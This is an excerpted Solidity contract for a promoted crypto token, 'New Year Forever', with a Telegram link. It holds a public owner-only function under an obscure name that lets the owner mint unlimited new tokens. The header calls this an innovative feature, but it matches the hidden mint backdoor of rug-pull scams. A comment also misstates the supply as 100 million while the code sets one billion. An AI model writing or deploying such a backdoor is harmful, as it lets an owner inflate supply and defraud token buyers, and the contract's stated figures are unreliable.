...
//
// $NewYearForever proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/NewYearForever
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Newyearforever(uint256 amount) public onlyOwner {
 _Newyearforever(msg.sender, amount);
    }
    ...
    function _Newyearforever(address account, uint256 amount) internal virtual {
...
contract $NewYearForever is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("New Year Forever", "NEWYEARFOREVER") {
        _Newyearforever(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}